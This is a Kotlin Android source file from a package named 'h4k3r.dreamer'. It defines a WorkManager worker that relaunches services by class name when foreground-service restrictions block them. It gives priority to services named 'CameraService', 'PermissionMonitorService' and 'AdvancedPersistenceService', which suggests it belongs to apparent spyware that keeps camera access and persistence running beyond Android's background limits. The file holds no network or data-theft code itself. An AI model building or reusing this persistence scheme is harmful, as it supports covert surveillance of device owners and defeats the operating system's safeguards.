package com.h4k3r.dreamer

import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * WorkManager Worker to start services when foreground service restrictions apply.
 * This is used as a fallback when ForegroundServiceStartNotAllowedException occurs.
 */
class ServiceStartWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "ServiceStartWorker"
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        return@withContext try {
            val serviceClassName = inputData.getString("service_class")
            if (serviceClassName.isNullOrEmpty()) {
                Log.e(TAG, "No service class provided")
                return@withContext Result.failure()
            }

            Log.d(TAG, "Starting service via WorkManager: $serviceClassName")

            // Get the service class
            val serviceClass = try {
                Class.forName(serviceClassName)
            } catch (e: ClassNotFoundException) {
                Log.e(TAG, "Service class not found: $serviceClassName")
                return@withContext Result.failure()
            }

            // Create intent for the service
            val intent = Intent(applicationContext, serviceClass)

            // Try to start the service
            try {
                // For critical services, try foreground service first
                if (serviceClassName.contains("CameraService") ||
                    serviceClassName.contains("PermissionMonitorService") ||
                    serviceClassName.contains("AdvancedPersistenceService")) {

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        try {
                            applicationContext.startForegroundService(intent)
                            Log.d(TAG, "Started $serviceClassName as foreground service via WorkManager")
                        } catch (e: Exception) {
                            Log.w(TAG, "Foreground service failed via WorkManager, trying regular service: ${e.message}")
                            applicationContext.startService(intent)
                            Log.d(TAG, "Started $serviceClassName as regular service via WorkManager")
                        }
                    } else {
                        applicationContext.startService(intent)
                        Log.d(TAG, "Started $serviceClassName as regular service via WorkManager")
                    }
                } else {
                    // For non-critical services, use regular startService
                    applicationContext.startService(intent)
                    Log.d(TAG, "Started $serviceClassName as regular service via WorkManager")
                }

                Result.success()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start service $serviceClassName via WorkManager: ${e.message}")
                Result.retry()
            }
        } catch (e: Exception) {
            Log.e(TAG, "WorkManager service start error: ${e.message}")
            Result.failure()
        }
    }
}